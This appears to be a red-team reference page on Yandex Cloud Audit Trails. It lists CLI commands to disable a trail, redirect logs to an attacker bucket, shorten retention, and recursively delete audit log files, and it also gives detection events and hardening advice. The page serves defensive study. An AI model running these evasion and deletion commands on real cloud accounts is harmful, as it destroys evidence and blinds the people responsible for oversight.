# Audit Trails

## Overview

Audit Trails collects management and data events across all Yandex Cloud services and delivers them to Object Storage, Cloud Logging, or Data Streams. For red teams, Audit Trails is both a detection mechanism to evade and an intelligence source to exploit.

## Defense Evasion

### Disable Audit Trail

```bash
yc audit-trails trail update <trail-id> --new-status INACTIVE
```

Stops event collection entirely.

### Redirect Audit Trail

Modify the trail to deliver logs to an attacker-controlled bucket or log group:

```bash
yc audit-trails trail update <trail-id> \
  --destination-bucket <attacker-bucket>
```

Events continue being collected but are delivered to attacker's storage.

### Reduce Log Retention

If logs are delivered to Cloud Logging:

```bash
yc logging group update <group-id> --retention-period 1h
```

Evidence is automatically deleted after 1 hour.

### Delete Log Objects

If logs are delivered to Object Storage, delete the log files:

```bash
aws s3 rm s3://<audit-bucket>/audit/ --recursive \
  --endpoint-url https://storage.yandexcloud.net
```

---

## Post-Exploitation (Intelligence Gathering)

### Read Audit Logs

Audit logs reveal:
- **Who has access** — authentication events, role assignments
- **What operations are performed** — resource creation, modification, deletion
- **Security monitoring gaps** — which events are collected, which aren't
- **Incident response patterns** — how quickly events are investigated
- **Service account usage** — which SAs are active and what they do

### Key Events to Search

```bash
# Find all admin role assignments
grep "admin" audit-logs/*.json

# Find credential creation events
grep "keys.create\|apiKeys.create\|accessKeys.create" audit-logs/*.json

# Find authentication failures (targeting)
grep "authentication.failed" audit-logs/*.json

# Find security group changes
grep "securityGroups.updateRules" audit-logs/*.json
```

---

## Enumeration

```bash
yc audit-trails trail list --folder-id <folder-id>
yc audit-trails trail get <trail-id>  # destination, status, scope
yc logging group list --folder-id <folder-id>
```

---

## Critical Audit Events to Monitor (Blue Team)

```
# Identity events
authentication.authenticate
iam.serviceAccounts.create / delete
iam.keys.create / apiKeys.create / accessKeys.create
iam.workloadIdentityFederatedCredentials.create

# Access control
resourcemanager.clouds.updateAccessBindings
resourcemanager.folders.updateAccessBindings

# Infrastructure
compute.instances.create / updateMetadata
compute.snapshots.create
vpc.securityGroups.updateRules
dns.zones.updateRecords

# Data access
lockbox.payloads.get
kms.symmetricCrypto.decrypt
storage.buckets.update

# Audit manipulation (highest priority)
audit-trails.trails.update
logging.groups.update
```

---

## Detection

| Event | Audit Key |
|---|---|
| Trail status change | `audit-trails.trails.update` |
| Trail deletion | `audit-trails.trails.delete` |
| Log group modification | `logging.groups.update` |

## Defensive Recommendations

1. Write audit logs to a **separate** cloud/folder with restricted access
2. Use immutable Object Storage (object lock) for audit log delivery
3. Alert immediately on trail status changes or destination modifications
4. Export to external SIEM for redundant log storage
5. Restrict `audit-trails.admin` to security team only
6. Monitor for log group retention changes
